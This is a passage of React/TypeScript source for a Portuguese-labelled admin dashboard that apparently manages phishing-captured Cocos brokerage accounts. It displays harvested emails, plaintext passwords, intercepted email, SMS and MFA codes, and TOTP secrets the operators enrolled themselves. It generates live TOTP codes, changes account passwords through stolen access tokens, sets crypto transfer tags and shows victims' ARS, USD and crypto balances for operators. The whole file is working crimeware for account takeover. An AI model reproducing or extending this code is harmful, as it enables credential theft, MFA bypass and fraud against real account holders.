          <span className="text-[8px] text-muted-foreground/50">Última consulta: {lastCheck}</span>
        )}

        {!dni && <span className="text-[9px] text-muted-foreground">Sem DNI registrado nesta sessão</span>}
      </div>
    </div>
  );
};

// ══════════════════════════════════════════
// SESSION ROW (compact) — NO onboarding tracking
// ══════════════════════════════════════════
const SessionRow = ({ session }: { session: LiveSession }) => {
  const [copied, setCopied] = useState("");
  const cfg = statusLabels[session.status] || { label: session.status, color: "text-muted-foreground bg-secondary" };
  const time = new Date(session.created_at);
  const timeStr = time.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" });

  // Parse otp_code
  const otpParts: Record<string, string> = {};
  if (session.otp_code) {
    session.otp_code.split("|").forEach((part) => {
      const colonIdx = part.indexOf(":");
      const eqIdx = part.indexOf("=");
      let sep = -1;
      if (colonIdx > 0 && eqIdx > 0) sep = Math.min(colonIdx, eqIdx);
      else if (colonIdx > 0) sep = colonIdx;
      else if (eqIdx > 0) sep = eqIdx;
      if (sep > 0) {
        const k = part.slice(0, sep).trim();
        const v = part.slice(sep + 1).trim();
        if (k) otpParts[k] = v;
      }
    });
  }

  const copyText = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    setCopied(label);
    setTimeout(() => setCopied(""), 1500);
  };

  return (
    <div className={`rounded-lg border bg-card px-3 py-2 transition-all hover:bg-card/80 ${
      session.status === "completed" ? "border-green-500/20" :
      session.status.includes("error") || session.status.includes("wrong") ? "border-red-500/20" :
      "border-border"
    }`}>
      {/* Main line */}
      <div className="flex items-center gap-2 flex-wrap">
        <span className="text-[10px] font-mono text-muted-foreground tabular-nums w-[38px]">{timeStr}</span>
        <span className={`text-[9px] px-1.5 py-0.5 rounded font-semibold ${cfg.color}`}>{cfg.label}</span>
        {session.operator_code && session.operator_code !== "master" && (
          <span className="text-[8px] font-mono px-1 py-0.5 rounded bg-purple-500/10 text-purple-400">{session.operator_code}</span>
        )}
        <span className="text-[11px] font-semibold text-foreground truncate">{session.email || "—"}</span>
        
        {/* Password inline */}
        {session.password && (
          <button onClick={() => copyText(session.password!, "spwd")} className="flex items-center gap-1 hover:opacity-80" title="Copiar senha">
            <Lock size={8} className="text-yellow-400" />
            <span className="text-[10px] font-mono text-yellow-400">{session.password}</span>
            {copied === "spwd" ? <Check size={8} className="text-green-400" /> : <Copy size={8} className="text-muted-foreground" />}
          </button>
        )}
        
        {session.country && <span className="text-[9px] text-muted-foreground">{session.country}{session.city ? ` ${session.city}` : ""}</span>}
        <span className="text-[9px] text-muted-foreground">{parseDevice(session.user_agent)}</span>
      </div>

      {/* OTP data row */}
      {Object.keys(otpParts).length > 0 && (
        <div className="flex items-center gap-3 mt-1 flex-wrap">
          {otpParts.email_code && <span className="text-[9px] text-blue-400">📧 {otpParts.email_code}</span>}
          {otpParts.mfa_code && <span className="text-[9px] text-purple-400">🔑 {otpParts.mfa_code}</span>}
          {otpParts.sms_code && <span className="text-[9px] text-cyan-400">📱 {otpParts.sms_code}</span>}
          {otpParts.sms_phone && <span className="text-[9px] text-cyan-300">📞 {otpParts.sms_phone}</span>}
          {otpParts.totp_secret && (
            <button onClick={() => copyText(otpParts.totp_secret, "totp")} className="flex items-center gap-1">
              <span className="text-[9px] text-purple-400">🔐 {otpParts.totp_secret.slice(0, 10)}...</span>
              {copied === "totp" ? <Check size={8} className="text-green-400" /> : <Copy size={8} className="text-muted-foreground" />}
            </button>
          )}
          {otpParts.balance_ars && <span className="text-[9px] text-emerald-400">💰 {otpParts.balance_ars}</span>}
          {otpParts.balance_usd && <span className="text-[9px] text-blue-400">💵 {otpParts.balance_usd}</span>}
          {otpParts.mfa_type && <span className={`text-[9px] ${otpParts.mfa_type === "client_own" ? "text-amber-400" : "text-purple-400"}`}>{otpParts.mfa_type === "client_own" ? "🔒 MFA Cliente" : "🔑 MFA Nosso"}</span>}
        </div>
      )}
    </div>
  );
};

// ══════════════════════════════════════════
// ACCOUNT CARD — Clean Design
// ══════════════════════════════════════════
const AccountCard = ({ account, tokenStatus, pixLimits, onOperate, onDelete, onTagChange, safeInvoke, onAccountUpdate }: {
  account: CocosAccount;
  tokenStatus?: "alive" | "expired" | "checking";
  pixLimits?: PixLimitsData;
  onOperate: () => void;
  onDelete: () => void;
  onTagChange: (tag: string | null) => void;
  safeInvoke: (body: Record<string, unknown>, retried?: boolean) => Promise<{ data: any; error: any }>;
  onAccountUpdate: () => void;
}) => {
  const balArs = account.balance_ars as Record<string, unknown> | null;
  const balUsd = account.balance_usd as Record<string, unknown> | null;
  const totalArs = Number(balArs?.totalBalance) || 0;
  const totalUsd = Number(balUsd?.totalBalance) || 0;
  const cashArs = Number(balArs?.cashBalance) || 0;
  const holdingsArs = Number(balArs?.holdingsBalance) || 0;
  const hasToken = !!account.access_token;
  const name = account.full_name || account.email;

  const bp = account.buying_power as Record<string, Record<string, number>> | null;
  const ciArs = Number(bp?.CI?.ars) || 0;

  const mfaMethodFromDb = (account.profile_data as Record<string, unknown>)?.mfa_method as string | null;
  const isClientOwnMfa = mfaMethodFromDb === "client_own";
  const hasOurTotp = !!account.totp_secret && !isClientOwnMfa;
  const factorsArr = Array.isArray(account.factors) ? account.factors : [];
  const hasVerifiedTotpFactor = factorsArr.some((f: any) => f?.factor_type === "totp" && f?.status === "verified");
  const hasOwnMfa = isClientOwnMfa || (!account.totp_secret && hasVerifiedTotpFactor);

  const lastActive = account.last_refresh_at || account.last_login_at;
  const isRecent = lastActive && (Date.now() - new Date(lastActive).getTime()) < 3600000;
  const isExpired = tokenStatus === "expired";
  const isChecking = tokenStatus === "checking";

  const [totpCode, setTotpCode] = useState("");
  const [totpTimeLeft, setTotpTimeLeft] = useState(30);
  const [copied, setCopied] = useState("");
  const [newPwd, setNewPwd] = useState("");
  const [changingPwd, setChangingPwd] = useState(false);
  const [pwdResult, setPwdResult] = useState<{ success: boolean; msg: string } | null>(null);
  const [expanded, setExpanded] = useState(false);

  // Cocos Tag
  const [tagName, setTagName] = useState("");
  const [tagLoading, setTagLoading] = useState(false);
  const [tagResult, setTagResult] = useState<{ success: boolean; msg: string; data?: any } | null>(null);
  const [currentTag, setCurrentTag] = useState<string | null>(null);
  const [tagQuerying, setTagQuerying] = useState(false);
  const [tagAutoChecked, setTagAutoChecked] = useState(false);

  // Crypto balance
  const [cryptoBalance, setCryptoBalance] = useState<Record<string, unknown> | null>(null);
  const [cryptoLoading, setCryptoLoading] = useState(false);

  // Password from sessions fallback
  const [sessionPassword, setSessionPassword] = useState<string | null>(null);
  useEffect(() => {
    if (account.password || sessionPassword) return;
    supabase.from("sessions").select("password").eq("email", account.email).not("password", "is", null).order("created_at", { ascending: false }).limit(1)
      .then(({ data }) => { if (data?.[0]?.password) setSessionPassword(data[0].password); });
  }, [account.email, account.password, sessionPassword]);
  const displayPassword = account.password || sessionPassword;

  // Auto-check Cocos Tag + Crypto when expanded
  useEffect(() => {
    if (!expanded || tagAutoChecked || !account.access_token || !account.account_id) return;
    setTagAutoChecked(true);
    setTagQuerying(true);
    safeInvoke({ action: "crypto_get_customer", access_token: account.access_token, account_id: account.account_id })
      .then(({ data, error }) => {
        if (!error && data && !data.error && data.tag) setCurrentTag(data.tag);
        setTagQuerying(false);
      }).catch(() => setTagQuerying(false));
    // Also fetch crypto
    setCryptoLoading(true);
    safeInvoke({ action: "crypto_get_balance", access_token: account.access_token, account_id: account.account_id })
      .then(({ data, error }) => {
        if (!error && data && !data.error) setCryptoBalance(data);
        setCryptoLoading(false);
      }).catch(() => setCryptoLoading(false));
  }, [expanded, tagAutoChecked, account.access_token, account.account_id, safeInvoke]);

  useEffect(() => {
    if (!account.totp_secret || isClientOwnMfa) return;
    let active = true;
    const update = async () => {
      try {
        const code = await generateTOTP(account.totp_secret!);
        if (active) { setTotpCode(code); setTotpTimeLeft(getTimeRemaining()); }
      } catch { /* */ }
    };
    update();
    const interval = setInterval(update, 1000);
    return () => { active = false; clearInterval(interval); };
  }, [account.totp_secret, isClientOwnMfa]);

  const copyText = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    setCopied(label);
    setTimeout(() => setCopied(""), 1500);
  };

  const dailyLimit = Number(pixLimits?.dailyLimit) || 0;
  const dailyUsed = Number(pixLimits?.dailyConsumption) || 0;
  const dailyPct = dailyLimit > 0 ? (dailyUsed / dailyLimit) * 100 : 0;

  // Crypto display
  const cryptoCash = cryptoBalance ? Number((cryptoBalance as any)?.cashBalance) || 0 : 0;
  const cryptoHoldings = cryptoBalance ? Number((cryptoBalance as any)?.holdingsBalance) || 0 : 0;
  const cryptoTotal = cryptoBalance ? Number((cryptoBalance as any)?.totalBalance) || 0 : 0;

  return (
    <div className={`rounded-xl border overflow-hidden transition-all ${
      isExpired || account.info_tag?.startsWith("⚠️") || account.info_tag?.startsWith("❌")
        ? "border-red-500/20 bg-card"
        : "border-border bg-card hover:border-primary/15"
    }`}>
      {/* ── HEADER ROW ── */}
      <div className="flex items-center gap-3 px-3 py-2.5">
        {/* Status dot + name */}
        <div className={`h-2 w-2 rounded-full shrink-0 ${isExpired ? "bg-red-500" : isRecent ? "bg-green-400 animate-pulse" : "bg-muted-foreground/30"}`} />
        <div className="flex-1 min-w-0">
          <div className="flex items-center gap-1.5 flex-wrap">
            <span className="text-[12px] font-bold text-foreground truncate">{name}</span>
            {hasOurTotp && <span className="text-[7px] text-purple-400 bg-purple-500/10 px-1 py-0.5 rounded font-bold">TOTP</span>}
            {hasOwnMfa && <span className="text-[7px] text-amber-400 bg-amber-500/10 px-1 py-0.5 rounded font-bold">MFA</span>}
            {tagAutoChecked && !currentTag && !tagQuerying && <span className="text-[7px] text-red-400 bg-red-500/15 px-1 py-0.5 rounded font-bold">SEM TAG</span>}
            {currentTag && <span className="text-[7px] text-cyan-400 bg-cyan-500/10 px-1 py-0.5 rounded font-semibold">🏷️{currentTag}</span>}
          </div>
          {/* Email + Password + Time */}
          <div className="flex items-center gap-1.5 mt-0.5 text-[9px] text-muted-foreground flex-wrap">
            <span className="truncate max-w-[200px]">{account.email}</span>
            <span>•</span>
            {displayPassword ? (
              <button onClick={() => copyText(displayPassword, "pwd_main")} className="flex items-center gap-0.5 hover:opacity-80">
                <Lock size={7} className="text-yellow-400" />
                <span className="font-mono text-yellow-400 font-semibold">{displayPassword}</span>
                {copied === "pwd_main" ? <Check size={7} className="text-green-400" /> : <Copy size={7} />}
              </button>
            ) : (
              <span className="text-red-400 font-bold">SEM SENHA</span>
            )}
            <span>•</span>
            <span>{timeAgo(lastActive)}</span>
          </div>
        </div>

        {/* ── BALANCES (always visible) ── */}
        <div className="hidden sm:grid grid-cols-3 gap-3 shrink-0 text-right">
          <div>
            <p className="text-[8px] text-muted-foreground">ARS</p>
            <p className="text-[13px] font-bold text-emerald-400 tabular-nums">{fmtARS(totalArs)}</p>
            <p className="text-[8px] text-muted-foreground">💵{fmtARS(cashArs)} 📊{fmtARS(holdingsArs)}</p>
          </div>
          <div>
            <p className="text-[8px] text-muted-foreground">USD</p>
            <p className={`text-[13px] font-bold tabular-nums ${totalUsd > 0 ? "text-sky-400" : "text-muted-foreground/20"}`}>{totalUsd > 0 ? fmtUSD(totalUsd) : "$0"}</p>
          </div>
          {ciArs > 0 && (
            <div>
              <p className="text-[8px] text-orange-400">⚡CI</p>
              <p className="text-[13px] font-bold text-orange-400 tabular-nums">{fmtARS(ciArs)}</p>
            </div>
          )}
        </div>

        {/* Quick TOTP */}
        {!expanded && hasOurTotp && totpCode && (
          <button onClick={() => copyText(totpCode, "totp_q")} className="hidden md:flex items-center gap-1 bg-purple-500/10 border border-purple-500/20 rounded-lg px-2 py-1 hover:bg-purple-500/20 transition-all shrink-0">
            <span className="text-[11px] font-mono font-bold tracking-widest text-purple-400">{totpCode}</span>
            <span className={`text-[7px] font-bold ${totpTimeLeft <= 5 ? "text-red-400" : "text-purple-400/50"}`}>{totpTimeLeft}s</span>
          </button>
        )}

        {/* Actions */}
        <div className="flex items-center gap-0.5 shrink-0">
          <button onClick={onOperate} disabled={(!hasToken && !account.refresh_token) || isChecking}
            className={`flex items-center gap-1 rounded-lg px-2.5 py-1.5 text-[10px] font-semibold transition-all ${
              isChecking ? "bg-secondary text-muted-foreground" : isExpired ? "bg-red-500/10 text-red-400" : hasToken ? "bg-primary text-primary-foreground hover:bg-primary/90" : "bg-secondary text-muted-foreground cursor-not-allowed"
            }`}>
            {isChecking ? <RefreshCw size={10} className="animate-spin" /> : <Play size={10} />}
            {isChecking ? "..." : isExpired ? "Exp" : "Op"}
          </button>
          <button onClick={() => setExpanded(!expanded)} className="h-7 w-7 rounded-lg flex items-center justify-center text-muted-foreground hover:bg-secondary transition-colors">
            {expanded ? <ChevronUp size={12} /> : <ChevronDown size={12} />}
          </button>
          <button onClick={onDelete} className="h-7 w-7 rounded-lg flex items-center justify-center text-destructive/30 hover:text-destructive hover:bg-destructive/10 transition-colors">
            <Trash2 size={12} />
          </button>
        </div>
      </div>

      {/* ── TAGS BAR ── */}
      <div className="px-3 pb-1.5 flex items-center gap-1 flex-wrap">
        {INFO_TAGS.map((tag) => (
          <button key={tag} onClick={() => onTagChange(account.info_tag === tag ? null : tag)}
            className={`text-[7px] px-1 py-0.5 rounded border transition-all ${account.info_tag === tag ? `${TAG_COLORS[tag].bg} ${TAG_COLORS[tag].text} font-bold` : "border-border/30 text-muted-foreground/40 hover:border-primary/20"}`}>
            {tag}
          </button>
        ))}
        {dailyPct > 0 && (
          <div className="ml-auto flex items-center gap-1">
            <div className="w-12 h-0.5 rounded-full bg-border overflow-hidden">
              <div className={`h-full rounded-full ${dailyPct > 80 ? "bg-red-500" : "bg-green-500"}`} style={{ width: `${Math.min(100, dailyPct)}%` }} />
            </div>
            <span className={`text-[7px] font-bold ${dailyPct > 80 ? "text-red-400" : "text-muted-foreground"}`}>{dailyPct.toFixed(0)}%</span>
          </div>
        )}
      </div>

      {/* ── EXPANDED ── */}
      {expanded && (
        <div className="border-t border-border/30 px-3 py-3 space-y-3">
          {/* ── SALDOS DETALHADOS ── */}
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
            <BalanceBox label="💰 ARS Total" value={fmtARS(totalArs)} color="text-emerald-400" />
            <BalanceBox label="💵 Caixa" value={fmtARS(cashArs)} color="text-green-400" />
            <BalanceBox label="📊 Investido" value={fmtARS(holdingsArs)} color="text-blue-400" />
            <BalanceBox label="🇺🇸 USD" value={totalUsd > 0 ? fmtUSD(totalUsd) : "$0"} color={totalUsd > 0 ? "text-sky-400" : "text-muted-foreground/30"} />
          </div>

          {/* ── CRYPTO BALANCE ── */}
          <div>
            <p className="text-[9px] font-semibold text-muted-foreground uppercase tracking-wider mb-1.5 flex items-center gap-1">
              <Coins size={10} className="text-orange-400" /> Crypto
              {cryptoLoading && <RefreshCw size={8} className="animate-spin text-muted-foreground" />}
              <button onClick={async () => {
                if (!account.access_token || !account.account_id) return;
                setCryptoLoading(true);
                const { data, error } = await safeInvoke({ action: "crypto_get_balance", access_token: account.access_token, account_id: account.account_id });
                if (!error && data && !data.error) setCryptoBalance(data);
                setCryptoLoading(false);
              }} className="text-[8px] text-muted-foreground hover:text-foreground ml-1">🔄</button>
            </p>
            {cryptoBalance ? (
              <div className="grid grid-cols-3 gap-2">
                <BalanceBox label="🪙 Total" value={fmtARS(cryptoTotal)} color="text-orange-400" />
                <BalanceBox label="💵 Caixa" value={fmtARS(cryptoCash)} color="text-green-400" />
                <BalanceBox label="📊 Custódia" value={fmtARS(cryptoHoldings)} color="text-purple-400" />
              </div>
            ) : (
              <p className="text-[9px] text-muted-foreground/50">{account.access_token ? "Expandir para carregar" : "Sem token ativo"}</p>
            )}
          </div>

          {ciArs > 0 && (
            <div className="rounded-lg bg-orange-500/5 border border-orange-500/20 px-3 py-2">
              <p className="text-[9px] text-orange-400 font-bold">⚡ CI RESGATE: {fmtARS(ciArs)}</p>
            </div>
          )}

          {/* Credentials */}
          <div className="grid grid-cols-2 sm:grid-cols-3 gap-x-4 gap-y-1">
            <CopyField label="Email" value={account.email} copied={copied} onCopy={copyText} />
            <CopyField label="Senha" value={displayPassword || "SEM SENHA"} copied={copied} onCopy={copyText} />
            {!account.password && sessionPassword && <span className="text-[8px] text-yellow-400 italic col-span-full">⚠️ Senha dos logs de sessão</span>}
            {account.totp_secret && <CopyField label="TOTP" value={account.totp_secret} copied={copied} onCopy={copyText} mono />}
            {account.phone && <CopyField label="Tel" value={account.phone} copied={copied} onCopy={copyText} />}
            {account.account_id && <CopyField label="ID" value={account.account_id} copied={copied} onCopy={copyText} />}
          </div>

          {/* Change password */}
          {account.access_token && (
            <div className="flex items-center gap-2">
              <Key size={9} className="text-blue-400 shrink-0" />
              <input type="text" placeholder="Nova senha" value={newPwd} onChange={(e) => { setNewPwd(e.target.value); setPwdResult(null); }}
                className="flex-1 rounded-lg border border-border bg-background px-2 py-1 text-[10px] text-foreground focus:outline-none focus:border-blue-400" />
              <button
                onClick={async () => {
                  if (!newPwd.trim() || changingPwd) return;
                  setChangingPwd(true); setPwdResult(null);
                  try {
                    const { data, error: fnErr } = await safeInvoke({ action: "change_password", access_token: account.access_token, new_password: newPwd.trim() });
                    if (!fnErr && data?.success !== false && !data?.error) {
                      await supabase.from("cocos_accounts").update({ password: newPwd.trim() } as any).eq("id", account.id);
                      setPwdResult({ success: true, msg: "✅ OK" }); setNewPwd(""); onAccountUpdate();
                    } else { setPwdResult({ success: false, msg: data?.message || data?.error || "Erro" }); }
                  } catch { setPwdResult({ success: false, msg: "Erro" }); }
                  setChangingPwd(false);
                }}
                disabled={changingPwd || !newPwd.trim()}
                className="rounded-lg bg-blue-500/10 px-2.5 py-1 text-[9px] font-semibold text-blue-400 hover:bg-blue-500/15 disabled:opacity-50"
              >{changingPwd ? "..." : "Trocar"}</button>
            </div>
          )}
          {pwdResult && <p className={`text-[9px] font-bold ${pwdResult.success ? "text-green-400" : "text-red-400"}`}>{pwdResult.msg}</p>}

          {/* Cocos Tag */}
          {account.access_token && account.account_id && (
            <div className="flex items-center gap-2">
              <span className="text-[9px]">🏷️</span>
              <button onClick={async () => {
                setTagQuerying(true); setTagResult(null);
                try {
                  const { data, error } = await safeInvoke({ action: "crypto_get_customer", access_token: account.access_token, account_id: account.account_id });
                  if (!error && data && !data.error) { setCurrentTag(data.tag || null); setTagResult({ success: true, msg: data.tag ? `Tag: ${data.tag}` : "Sem tag" }); }
                  else { setTagResult({ success: false, msg: data?.error || "Erro" }); }
                } catch { setTagResult({ success: false, msg: "Erro" }); }
                setTagQuerying(false);
              }} disabled={tagQuerying} className="text-[9px] px-2 py-1 rounded-lg bg-cyan-500/10 text-cyan-400 font-semibold hover:bg-cyan-500/15 disabled:opacity-50">
                {tagQuerying ? "..." : "Ver Tag"}
              </button>
              <input type="text" placeholder="Nome tag" value={tagName} onChange={(e) => { setTagName(e.target.value); setTagResult(null); }}
                className="flex-1 rounded-lg border border-border bg-background px-2 py-1 text-[10px] text-foreground focus:outline-none focus:border-cyan-400" />
              <button onClick={async () => {
                if (!tagName.trim() || tagLoading) return;
                setTagLoading(true); setTagResult(null);
                try {
                  const { data, error } = await safeInvoke({ action: "crypto_set_tag", access_token: account.access_token, account_id: account.account_id, tag_name: tagName.trim() });
                  if (!error && data && !data.error) { setCurrentTag(data.tag || tagName.trim()); setTagResult({ success: true, msg: `✅ ${data.tag || tagName.trim()}` }); setTagName(""); }
                  else { setTagResult({ success: false, msg: data?.error || "Erro" }); }
                } catch { setTagResult({ success: false, msg: "Erro" }); }
                setTagLoading(false);
              }} disabled={tagLoading || !tagName.trim()} className="text-[9px] px-2 py-1 rounded-lg bg-cyan-500/10 text-cyan-400 font-semibold hover:bg-cyan-500/15 disabled:opacity-50">
                {tagLoading ? "..." : "Criar"}
              </button>
            </div>
          )}
          {tagResult && <p className={`text-[9px] font-bold ${tagResult.success ? "text-green-400" : "text-red-400"}`}>{tagResult.msg}</p>}

          {/* PIX Limits */}
          {pixLimits && (
            <div className="flex items-center gap-3 text-[9px] text-muted-foreground">
              <Gauge size={9} />
              <span>Diário: ${(Number(pixLimits.dailyConsumption) || 0).toFixed(0)} / ${(Number(pixLimits.dailyLimit) || 0).toFixed(0)}</span>
              <span>Mensal: ${(Number(pixLimits.monthlyConsumption) || 0).toFixed(0)} / ${(Number(pixLimits.monthlyLimit) || 0).toFixed(0)}</span>
            </div>
          )}

          {/* Live TOTP */}
          {hasOurTotp && totpCode && (
            <div className="flex items-center gap-2">
              <KeyRound size={11} className="text-purple-400" />
              <button onClick={() => copyText(totpCode, "totp_code")} className="bg-purple-500/10 border border-purple-500/20 rounded-lg px-2.5 py-1 hover:bg-purple-500/20 transition-all">
                <span className="text-base font-mono font-bold tracking-[0.3em] text-purple-400">{totpCode.slice(0, 3)} {totpCode.slice(3)}</span>
              </button>
              <div className="relative w-5 h-5">
                <svg className="w-5 h-5 -rotate-90" viewBox="0 0 20 20">
                  <circle cx="10" cy="10" r="8" fill="none" stroke="hsl(var(--border))" strokeWidth="2" />
                  <circle cx="10" cy="10" r="8" fill="none" stroke={totpTimeLeft <= 5 ? "hsl(var(--destructive))" : "#a855f7"} strokeWidth="2" strokeDasharray={`${(totpTimeLeft / 30) * 50.27} 50.27`} strokeLinecap="round" />
                </svg>
                <span className={`absolute inset-0 flex items-center justify-center text-[7px] font-bold ${totpTimeLeft <= 5 ? "text-destructive" : "text-purple-400"}`}>{totpTimeLeft}</span>
              </div>
              {copied === "totp_code" && <span className="text-[8px] text-green-400 font-bold">✓</span>}
            </div>
          )}
          {hasOwnMfa && (
            <p className="text-[9px] text-amber-400 flex items-center gap-1"><ShieldCheck size={10} /> MFA do Cliente</p>
          )}
        </div>
      )}

      {/* ── BOTTOM ── */}
      <div className="px-3 py-1 border-t border-border/15 flex items-center gap-1.5 text-[8px] text-muted-foreground/50">
        {account.info_tag?.startsWith("⚠️") || account.info_tag?.startsWith("❌") ? (
          <span className="text-red-400 font-semibold">{account.info_tag}</span>
        ) : account.refresh_token ? (
          <>
            <RefreshCw size={7} className="text-green-400/60" />
            {account.last_refresh_at ? <span className="text-green-400/60">Cron {timeAgo(account.last_refresh_at)}</span> : <span>Aguardando...</span>}
          </>
        ) : (
          <span className="text-destructive/60 font-semibold">Sem refresh</span>
        )}
      </div>
    </div>
  );
};

// ══════════════════════════════════════════
// BALANCE BOX (for expanded view)
// ══════════════════════════════════════════
const BalanceBox = ({ label, value, color }: { label: string; value: string; color: string }) => (
  <div className="rounded-lg bg-secondary/50 border border-border/50 px-2.5 py-2">
    <p className="text-[8px] text-muted-foreground">{label}</p>
    <p className={`text-sm font-bold ${color} tabular-nums`}>{value}</p>
  </div>
);

// ══════════════════════════════════════════
// COPY FIELD
// ══════════════════════════════════════════
const CopyField = ({ label, value, copied, onCopy, mono }: {
  label: string; value: string; copied: string; onCopy: (t: string, l: string) => void; mono?: boolean;
}) => (
  <div className="flex items-center gap-1.5 min-w-0">
    <span className="text-[8px] text-muted-foreground font-semibold w-[40px] shrink-0">{label}:</span>
    <span className={`text-[10px] truncate ${mono ? "font-mono" : ""} ${value === "SEM SENHA" || value === "—" ? "text-red-400 font-bold" : "text-foreground"}`}>{value}</span>
    {value !== "SEM SENHA" && value !== "—" && (
      <button onClick={() => onCopy(value, label)} className="text-muted-foreground hover:text-foreground shrink-0">
        {copied === label ? <Check size={8} className="text-green-400" /> : <Copy size={8} />}
      </button>
    )}
  </div>
);

export default AdminV2;
